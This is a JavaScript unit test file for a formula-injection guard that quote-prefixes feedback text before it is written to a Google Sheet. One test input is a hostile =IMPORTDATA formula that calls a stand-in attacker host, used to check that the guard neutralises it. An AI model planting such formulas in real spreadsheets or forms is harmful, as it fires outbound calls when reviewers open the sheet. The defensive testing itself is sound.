// SPDX-License-Identifier: AGPL-3.0-only
// ============================================================
//  tests/sheetSafe.test.js — real unit tests for src/index.js's
//  _sheetSafe(), the CSV/formula-injection guard (CWE-1236) applied
//  to every free-text field before it's forwarded to the Google
//  Sheet feedback channel. Google Sheets evaluates a cell as a
//  formula the moment it's viewed if the raw value starts with
//  =, +, -, or @ — a malicious feedback submission could otherwise
//  plant a formula (e.g. =IMPORTDATA(...)) that fires on a human
//  reviewer simply opening the sheet, not just on CSV export.
//
//  Pure function (no Workers-runtime dependency), so a real import
//  + Node's own assert works fine; no Miniflare needed.
//
//  Run: node tests/sheetSafe.test.js
// ============================================================

import { _sheetSafe } from '../src/index.js';

let passed = 0, failed = 0;
function test(name, fn) {
  try { fn(); console.log(`  ✓ ${name}`); passed++; }
  catch (e) { console.error(`  ✗ ${name}\n    ${e.message}`); failed++; }
}
function expect(actual) {
  return {
    toBe: (e) => { if (actual !== e) throw new Error(`Expected ${JSON.stringify(e)}, got ${JSON.stringify(actual)}`); },
  };
}

console.log('\n_sheetSafe — CSV/formula injection guard:');

test('leading = gets quote-prefixed (the classic formula trigger)', () => {
  expect(_sheetSafe('=IMPORTDATA("https://evil.example/track")')).toBe("'=IMPORTDATA(\"https://evil.example/track\")");
});

test('leading + gets quote-prefixed', () => {
  expect(_sheetSafe('+1234')).toBe("'+1234");
});

test('leading - gets quote-prefixed', () => {
  expect(_sheetSafe('-1234')).toBe("'-1234");
});

test('leading @ gets quote-prefixed', () => {
  expect(_sheetSafe('@mention')).toBe("'@mention");
});

test('ordinary text is untouched', () => {
  expect(_sheetSafe('The compress tool crashed on my file')).toBe('The compress tool crashed on my file');
});

test('a = appearing mid-string (not leading) is untouched', () => {
  expect(_sheetSafe('x=y did not work')).toBe('x=y did not work');
});

test('empty string is untouched (no false match)', () => {
  expect(_sheetSafe('')).toBe('');
});

// ── Summary ────────────────────────────────────────────────────
console.log(`\n${'─'.repeat(40)}`);
console.log(`Tests: ${passed + failed} | ✓ ${passed} | ${failed > 0 ? '✗ ' + failed : '0 failed'}`);
if (failed > 0) process.exit(1);
